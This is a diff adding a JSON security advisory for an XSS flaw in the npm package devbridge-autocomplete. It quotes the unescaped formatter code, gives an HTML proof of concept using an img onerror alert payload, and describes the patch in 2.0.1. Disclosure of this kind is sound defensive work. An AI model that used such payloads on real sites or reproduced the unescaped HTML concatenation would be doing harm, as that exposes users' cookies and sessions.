@@ -1,0 +1,49 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-06-22T23:00:51Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "devbridge-autocomplete"
+  },
+  "Advisory": {
+    "DatabaseId": 365660,
+    "Id": "GSA_kwCzR0hTQS1odnFoLWp3NjUtd2Nwcc4ABZRc",
+    "GhsaId": "GHSA-hvqh-jw65-wcpq",
+    "References": [
+      {
+        "Url": "https://github.com/devbridge/jQuery-Autocomplete/security/advisories/GHSA-hvqh-jw65-wcpq"
+      },
+      {
+        "Url": "https://github.com/devbridge/jQuery-Autocomplete/commit/63ff096ff5b77a90aac7fb5dad7c86e538a59ce0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-hvqh-jw65-wcpq"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-hvqh-jw65-wcpq"
+      }
+    ],
+    "Description": "### Summary\n\nThe default `formatGroup` and `formatResult` functions in `devbridge-autocomplete` concatenate values into HTML without escaping, allowing XSS when an attacker controls (or can taint) the suggestion data source.\n\n### Details\n\n**1. `formatGroup` — `category` is interpolated raw.**\n\n`src/format.ts`:\n\n```ts\nfunction formatGroup(suggestion, category) {\n    return '\u003cdiv class=\"autocomplete-group\"\u003e' + category + '\u003c/div\u003e';\n}\n```\n\nIf `groupBy` is used and the grouping field of any suggestion contains HTML, that HTML is executed.\n\n**2. `formatResult` — early-return branch returns `suggestion.value` raw.**\n\n`src/format.ts`:\n\n```ts\nfunction formatResult(suggestion, currentValue) {\n    if (!currentValue) {\n        return suggestion.value;   // un-escaped\n    }\n    /* ... non-empty path escapes correctly ... */\n}\n```\n\nThe early-return branch is reached when `suggest()` renders with an empty `currentValue`, which happens with `minChars: 0` and a server that returns suggestions for an empty query. The returned string is concatenated into the container's `innerHTML`.\n\n### PoC (formatGroup)\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n    \u003cmeta charset=\"utf-8\"\u003e\n    \u003ctitle\u003ePoC: formatGroup XSS in jQuery-Autocomplete v2.0.0\u003c/title\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n    \u003cinput id=\"ac\" type=\"text\" placeholder=\"Type 'a' to trigger\" autocomplete=\"off\"\u003e\n\n    \u003cscript src=\"https://code.jquery.com/jquery-3.7.1.min.js\"\u003e\u003c/script\u003e\n    \u003cscript src=\"dist/jquery.autocomplete.js\"\u003e\u003c/script\u003e\n    \u003cscript\u003e\n        var poisoned = [\n            { value: 'Apple',   data: { category: \"\u003cimg src=x onerror=\\\"alert('XSS via formatGroup')\\\"\u003e\" } },\n            { value: 'Avocado', data: { category: 'Safe Group' } }\n        ];\n\n        $('#ac').devbridgeAutocomplete({\n            lookup: poisoned,\n            groupBy: 'category',\n            minChars: 1\n        });\n    \u003c/script\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\nOriginally identified by an earlier human analysis; the PoC above was produced with the assistance of Claude Opus 4.7.\n\n### Impact\n\nXSS in pages that render attacker-controllable suggestion data. The actual impact depends on what the embedding page has access to (cookies, session tokens, DOM), per standard reflected/stored XSS.\n\n### Patch\n\nBoth formatters now run their interpolated input through the browser's text-node escaping (`createElement` + `textContent`) before producing the HTML string. Fixed in version `2.0.1`.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-06-22T23:00:50Z",
+    "Severity": "MODERATE",
+    "Summary": "devbridge-autocomplete has XSS in its default formatters: formatGroup and formatResult fail to escape HTML in untrusted inputs",
+    "UpdatedAt": "2026-06-22T23:00:51Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 5.4,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.0.1"
+      },
+      "VulnerableVersionRange": "\u003c= 2.0.0"
+    }
+  ]
+}
